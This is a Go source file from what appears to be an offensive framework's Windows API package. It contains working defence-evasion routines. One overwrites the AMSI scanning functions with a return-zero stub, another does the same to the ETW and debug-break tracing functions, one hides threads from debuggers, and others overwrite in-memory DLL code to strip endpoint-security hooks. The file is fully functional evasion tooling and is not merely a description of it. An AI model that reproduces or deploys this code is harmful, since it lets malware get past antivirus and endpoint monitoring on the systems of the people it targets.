//go:build windows
// +build windows

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package winapi

import (
	"strings"
	"syscall"
	"unsafe"

	"github.com/iDigitalFlame/xmt/device/arch"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
)

// PatchAmsi will attempt to zero out the following function calls with a
// ASM patch that returns with zero (Primary AMSI/PowerShell calls).
//
//   - AmsiInitialize
//   - AmsiScanBuffer
//   - AmsiScanString
//
// This will return an error if any of the patches fail.
//
// This function returns 'syscall.EINVAL' if ASMI is not avaliable on the target
// system, which is Windows 10 and newer.
func PatchAmsi() error {
	if !IsWindows10() {
		return syscall.EINVAL
	}
	if err := zeroPatch(funcAmsiInitialize); err != nil {
		return err
	}
	if err := zeroPatch(funcAmsiScanBuffer); err != nil {
		return err
	}
	if err := zeroPatch(funcAmsiScanString); err != nil {
		return err
	}
	return nil
}

// PatchTracing will attempt to zero out the following function calls with a
// ASM patch that returns with zero:
//
//   - NtTraceEvent
//   - DebugBreak
//   - DbgBreakPoint
//   - EtwEventWrite
//   - EtwEventRegister
//   - EtwEventWriteFull
//   - EtwNotificationRegister
//
// This will return an error if any of the patches fail.
//
// Any system older than Windows Vista will NOT patch ETW functions as they do
// not exist in older versions.
func PatchTracing() error {
	if err := zeroPatch(funcNtTraceEvent); err != nil {
		return err
	}
	if err := zeroPatch(funcDebugBreak); err != nil {
		return err
	}
	if err := zeroPatch(funcDbgBreakPoint); err != nil {
		return err
	}
	if !IsWindowsVista() {
		return nil
	}
	// NOTE(dij): These are only supported in Windows Vista and above.
	if err := zeroPatch(funcEtwEventWrite); err != nil {
		return err
	}
	if err := zeroPatch(funcEtwEventWriteFull); err != nil {
		return err
	}
	if err := zeroPatch(funcEtwEventRegister); err != nil {
		return err
	}
	if err := zeroPatch(funcEtwNotificationRegister); err != nil {
		return err
	}
	return nil
}

// HideGoThreads is a utility function that can aid in anti-debugging measures.
// This will set the "ThreadHideFromDebugger" flag on all GOLANG threads only.
func HideGoThreads() error {
	return ForEachThread(func(h uintptr) error {
		// 0x11 - ThreadHideFromDebugger
		if r, _, _ := syscallN(funcNtSetInformationThread.address(), h, 0x11, 0, 0); r > 0 {
			return formatNtError(r)
		}
		return nil
	})
}
func zeroPatch(p *lazyProc) error {
	if p.find() != nil || p.addr == 0 {
		// NOTE(dij): Not returning the error here so other function calls
		//            /might/ succeed.
		return nil
	}
	// 0x40 - PAGE_EXECUTE_READWRITE
	o, err := NtProtectVirtualMemory(CurrentProcess, p.addr, 5, 0x40)
	if err != nil {
		return err
	}
	(*(*[1]byte)(unsafe.Pointer(p.addr)))[0] = 0x48     // XOR
	(*(*[1]byte)(unsafe.Pointer(p.addr + 1)))[0] = 0x33 // RAX
	(*(*[1]byte)(unsafe.Pointer(p.addr + 2)))[0] = 0xC0 // RAX
	(*(*[1]byte)(unsafe.Pointer(p.addr + 3)))[0] = 0xC3 // RET
	(*(*[1]byte)(unsafe.Pointer(p.addr + 4)))[0] = 0xC3 // RET
	_, err = NtProtectVirtualMemory(CurrentProcess, p.addr, 5, o)
	syscallN(funcNtFlushInstructionCache.address(), CurrentProcess, p.addr, 5)
	return err
}

// PatchDLLFile attempts overrite the in-memory contents of the DLL name or file
// path provided to ensure it has "known-good" values.
//
// This function version will read in the DLL data from the local disk and will
// overwite the entire executable region.
//
// DLL base names will be expanded to full paths not if already full path names.
// (Unless it is a known DLL name).
func PatchDLLFile(dll string) error {
	a, b, err := ExtractDLLBase(dll)
	if err != nil {
		return err
	}
	return PatchDLL(dll, a, b)
}

// CheckDLLFile attempts to check the in-memory contents of the DLL name or file
// path provided to ensure it matches "known-good" values.
//
// This function version will read in the DLL data from the disk and will verify
// the entire executable region.
//
// DLL base names will be expanded to full paths not if already full path names.
// (Unless it is a known DLL name).
//
// This returns true if the DLL is considered valid/unhooked.
func CheckDLLFile(dll string) (bool, error) {
	a, b, err := ExtractDLLBase(dll)
	if err != nil {
		return false, err
	}
	return CheckDLL(dll, a, b)
}
func loadCachedEntry(dll string) (uintptr, error) {
	if len(dll) == 0 {
		return 0, ErrInvalidName
	}
	b := dll
	if !isBaseName(dll) {
		if i := strings.LastIndexByte(dll, '\\'); i > 0 && len(dll) > i {
			b = dll[i:]
		}
	}
	if len(b) == 0 {
		return 0, ErrInvalidName
	}
	switch {
	case strings.EqualFold(b, dllNtdll.name):
		if err := dllNtdll.load(); err != nil {
			return 0, err
		}
		return dllNtdll.addr, nil
	case strings.EqualFold(b, dllKernelBase.name):
		if err := dllKernel32.load(); err != nil {
			return 0, err
		}
		return dllKernel32.addr, nil
	case strings.EqualFold(b, dllKernel32.name):
		if err := dllKernel32.load(); err != nil {
			return 0, err
		}
		return dllKernel32.addr, nil
	case strings.EqualFold(b, dllAdvapi32.name):
		if err := dllAdvapi32.load(); err != nil {
			return 0, err
		}
		return dllAdvapi32.addr, nil
	case strings.EqualFold(b, dllUser32.name):
		if err := dllUser32.load(); err != nil {
			return 0, err
		}
		return dllUser32.addr, nil
	case strings.EqualFold(b, dllDbgHelp.name):
		if err := dllDbgHelp.load(); err != nil {
			return 0, err
		}
		return dllDbgHelp.addr, nil
	case strings.EqualFold(b, dllGdi32.name):
		if err := dllGdi32.load(); err != nil {
			return 0, err
		}
		return dllGdi32.addr, nil
	case strings.EqualFold(b, dllWinhttp.name):
		if err := dllWinhttp.load(); err != nil {
			return 0, err
		}
		return dllWinhttp.addr, nil
	case strings.EqualFold(b, dllWtsapi32.name):
		if err := dllWtsapi32.load(); err != nil {
			return 0, err
		}
		return dllWtsapi32.addr, nil
	}
	return loadLibraryEx(dll)
}

// PatchFunction attempts to overrite the in-memory contents of the DLL name or
// file path provided with the supplied function name to ensure it has "known-good"
// values.
//
// This function version will overwite the function base address against the supplied
// bytes. If the bytes supplied are nil/empty, this function returns an error.
//
// DLL base names will be expanded to full paths not if already full path names.
// (Unless it is a known DLL name).
func PatchFunction(dll, name string, b []byte) error {
	if len(b) == 0 {
		return ErrInsufficientBuffer
	}
	h, err := loadCachedEntry(dll)
	if err != nil {
		return err
	}
	p, err := findProc(h, name, dll)
	if err != nil {
		return err
	}
	if bugtrack.Enabled {
		bugtrack.Track("winapi.PatchFunction(): Writing supplied %d bytes %X-%X to dll=%s, name=%s.", len(b), p, p+uintptr(len(b)), dll, name)
	}
	// 0x40 - PAGE_EXECUTE_READWRITE
	//        NOTE(dij): Needs to be PAGE_EXECUTE_READWRITE so ntdll.dll doesn't
	//                   crash during runtime.
	o, err := NtProtectVirtualMemory(CurrentProcess, p, uint32(len(b)), 0x40)
	if err != nil {
		return err
	}
	for i := range b {
		(*(*[1]byte)(unsafe.Pointer(p + uintptr(i))))[0] = b[i]
	}
	if _, err = NtProtectVirtualMemory(CurrentProcess, p, uint32(len(b)), o); bugtrack.Enabled {
		bugtrack.Track("winapi.PatchFunction(): Patching %d bytes %X-%X to dll=%s, name=%s complete, err=%s", len(b), p, p+uintptr(len(b)), dll, name, err)
	}
	return err
}

// PatchDLL attempts to overrite the in-memory contents of the DLL name or file
// path provided to ensure it has "known-good" values.
//
// This function version will overwrite the DLL contents against the supplied bytes
// and starting address. The 'winapi.ExtractDLLBase' can suppply these values.
// If the byte array is nil/empty, this function returns an error.
//
// DLL base names will be expanded to full paths not if already full path names.
// (Unless it is a known DLL name).
func PatchDLL(dll string, addr uint32, b []byte) error {
	if len(b) == 0 {
		return ErrInsufficientBuffer
	}
	h, err := loadCachedEntry(dll)
	if err != nil {
		return err
	}
	var (
		n = uint32(len(b))
		a = h + uintptr(addr)
	)
	if bugtrack.Enabled {
		bugtrack.Track("winapi.PatchDLL(): Writing supplied %d bytes %X-%X to dll=%s", len(b), a, a+uintptr(len(b)), dll)
	}
	// 0x40 - PAGE_EXECUTE_READWRITE
	//        NOTE(dij): Needs to be PAGE_EXECUTE_READWRITE so ntdll.dll doesn't
	//                   crash during runtime.
	o, err := NtProtectVirtualMemory(CurrentProcess, a, n, 0x40)
	if err != nil {
		return err
	}
	for i := range b {
		(*(*[1]byte)(unsafe.Pointer(a + uintptr(i))))[0] = b[i]
	}
	if _, err = NtProtectVirtualMemory(CurrentProcess, a, n, o); bugtrack.Enabled {
		bugtrack.Track("winapi.PatchDLL(): Patching %d bytes %X-%X to dll=%s complete, err=%s", len(b), a, a+uintptr(len(b)), dll, err)
	}
	return err
}

// CheckFunction attempts to check the in-memory contents of the DLL name or file
// path provided with the supplied function name to ensure it matches "known-good"
// values.
//
// This function version will check the function base address against the supplied
// bytes. If the bytes supplied are nil/empty, this will do a simple long JMP/CALL
// Assembly check instead.
//
// DLL base names will be expanded to full paths not if already full path names.
// (Unless it is a known DLL name).
//
// This returns true if the DLL function is considered valid/unhooked.
func CheckFunction(dll, name string, b []byte) (bool, error) {
	h, err := loadCachedEntry(dll)
	if err != nil {
		return false, err
	}
	p, err := findProc(h, name, dll)
	if err != nil {
		return false, err
	}
	if len(b) > 0 {
		for i := range b {
			if (*(*[1]byte)(unsafe.Pointer(p + uintptr(i))))[0] != b[i] {
				if bugtrack.Enabled {
					bugtrack.Track("winapi.CheckFunction(): Difference in supplied bytes at %X, dll=%s, name=%s!", p+uintptr(i), dll, name)
				}
				return false, nil
			}
		}
		return true, nil
	}
	switch (*(*[1]byte)(unsafe.Pointer(p)))[0] {
	case 0xE9, 0xFF: // JMP
		if *(*uint32)(unsafe.Pointer(p + 1)) < 16 { // JMP too small to be a hook.
			return true, nil
		}
		if bugtrack.Enabled {
			bugtrack.Track("winapi.CheckFunction(): Detected an odd JMP instruction at %X, dll=%s, name=%s!", p, dll, name)
		}
		return false, nil
	}
	if v := (*(*[1]byte)(unsafe.Pointer(p + 1)))[0]; v == 0xFF || v == 0xCC {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.CheckFunction(): Detected an odd JMP instruction at %X, dll=%s, name=%s!", p, dll, name)
		}
		return false, nil
	}
	if (*(*[1]byte)(unsafe.Pointer(p + 2)))[0] == 0xCC || (*(*[1]byte)(unsafe.Pointer(p + 3)))[0] == 0xCC {
		if bugtrack.Enabled {
			bugtrack.Track("winapi.CheckFunction(): Detected an odd INT3 instruction at %X, dll=%s, name=%s!", p, dll, name)
		}
		return false, nil
	}
	// Interesting notice from BananaPhone: https://github.com/C-Sto/BananaPhone/blob/6585e59137610bc0f526bb6647384df74b4b30f3/pkg/BananaPhone/bananaphone.go#L256
	// Check for ntdll.dll functions doing syscall prep.
	// Check the first 4 bytes to see if they match.
	//
	//   mov r10, rcx     // 4C 8B D1 B8 51 00 00 00
	//   mov eax, [sysid] // B8 [sysid]
	//   ^ AMD64 Only
	//
	//   x86 calls SYSENTER at 7FFE0300 instead
	//   mov eax, [sysid]  // B8 [sysid]
	//   mov edx, 7ffe0300 // BA 00 03 FE 7F
	//
	// NOTE(dij): This can cause some false positives on non-syscall functions
	//            such as ETW or heap management functions.
	if dllNtdll.addr > 0 && h == dllNtdll.addr {
		switch arch.Current {
		case arch.ARM, arch.X86:
			if v := *(*[5]byte)(unsafe.Pointer(p + 5)); (*(*[1]byte)(unsafe.Pointer(p)))[0] != 0xB8 || v[0] != 0xBA || v[1] != 0x00 || v[2] != 0x03 || v[3] != 0xFE || v[4] != 0x7F {
				if bugtrack.Enabled {
					bugtrack.Track("winapi.CheckFunction(): Detected an ntdll function that does not match standard syscall instructions at %X, dll=%s, name=%s!", p, dll, name)
				}
				return false, nil
			}
		case arch.ARM64, arch.X64:
			if v := *(*[5]byte)(unsafe.Pointer(p)); v[0] != 0x4C || v[1] != 0x8B || v[2] != 0xD1 || v[3] != 0xB8 || v[4] != 0x51 {
				if bugtrack.Enabled {
					bugtrack.Track("winapi.CheckFunction(): Detected an ntdll function that does not match standard syscall instructions at %X, dll=%s, name=%s!", p, dll, name)
				}
				return false, nil
			}
		}
	}
	return true, nil
}

// CheckDLL attempts to check the in-memory contents of the DLL name or file path
// provided to ensure it matches "known-good" values.
//
// This function version will check the DLL contents against the supplied bytes
// and starting address. The 'winapi.ExtractDLLBase' can suppply these values.
// If the byte array is nil/empty, this function returns an error.
//
// DLL base names will be expanded to full paths not if already full path names.
// (Unless it is a known DLL name).
//
// This returns true if the DLL is considered valid/unhooked.
func CheckDLL(dll string, addr uint32, b []byte) (bool, error) {
	if len(b) == 0 {
		return false, ErrInsufficientBuffer
	}
	h, err := loadCachedEntry(dll)
	if err != nil {
		return false, err
	}
	a := h + uintptr(addr)
	for i := range b {
		if (*(*[1]byte)(unsafe.Pointer(a + uintptr(i))))[0] != b[i] {
			if bugtrack.Enabled {
				bugtrack.Track("winapi.CheckDLL(): Difference in supplied bytes at %X, dll=%s!", a+uintptr(i), dll)
			}
			return false, nil
		}
	}
	return true, nil
}
